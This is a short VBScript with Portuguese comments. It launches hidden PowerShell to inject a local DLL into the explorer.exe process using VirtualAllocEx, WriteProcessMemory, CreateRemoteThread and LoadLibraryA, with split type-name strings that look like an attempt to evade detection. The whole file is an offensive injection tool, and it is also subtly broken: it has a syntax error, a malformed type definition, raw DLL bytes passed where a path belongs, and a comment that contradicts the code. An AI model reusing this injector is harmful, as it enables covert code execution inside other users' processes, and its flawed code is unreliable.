'--- ajustes únicos ---
dllPath   = "C:\Users\Pz\Documents\oi.dll"  'caminho UNC ou local
targetPID = 0)                                    '0 = auto-injeta no próprio rundll32
'----------------------

Set w = CreateObject("WScript.Shell")

'1) Se quiser injetar em outro processo, descobre o PID
If targetPID = 0 Then
   targetPID = w.Exec("powershell -nop -c ""Get-Process explorer | Select-Object -ExpandProperty Id""").StdOut.ReadLine
End If

'2) Chama o injector (PowerShell de 1 linha)
cmd = "powershell -nop -w h -c ""$d='" & dllPath & "';$p=" & targetPID & ";" & _
      "Add-Type -TypeDefinition @'" & vbCrLf & _
      "[System.Runtime.InteropServices.DllImport('kernel32')] public static extern IntPtr GetProcAddress(IntPtr h,string n);" & vbCrLf & _
      "[System.Runtime.InteropServices.DllImport('kernel32')] public static extern IntPtr LoadLibrary(string d);" & vbCrLf & _
      "[System.Runtime.InteropServices.DllImport('kernel32')] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);" & vbCrLf & _
      "[System.Runtime.InteropServices.DllImport('kernel32')] public static extern bool WriteProcessMemory(IntPtr h,IntPtr b,byte[] s,uint l,out int w);" & vbCrLf & _
      "[System.Runtime.InteropServices.DllImport('kernel32')] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint t,out IntPtr i);" & vbCrLf & _
      "'@;" & _
      "$k = [PSObject].Assembly.GetType('System.Management.Automation.W'+'miObject');" & _
      "$n = $k.GetMethod('SetSecurityDescriptor', [Type[]]@([Type]::GetType('System.Management.Automation.P'+'SObject')));" & _
      "$h = (Get-Process -Id $p).Handle;" & _
      "$m = VirtualAllocEx $h [IntPtr]::Zero 0x1000 0x3000 0x40;" & _
      "$b = [System.IO.File]::ReadAllBytes($d);" & _
      "$w = 0; WriteProcessMemory $h $m $b $b.Length ([ref]$w);" & _
      "$l = GetProcAddress (LoadLibrary 'kernel32.dll') 'LoadLibraryA';" & _
      "$z = [IntPtr]::Zero; CreateRemoteThread $h [IntPtr]::Zero 0 $l $m 0 ([ref]$z);"""

'3) Roda em silêncio
w.Run cmd, 0, False
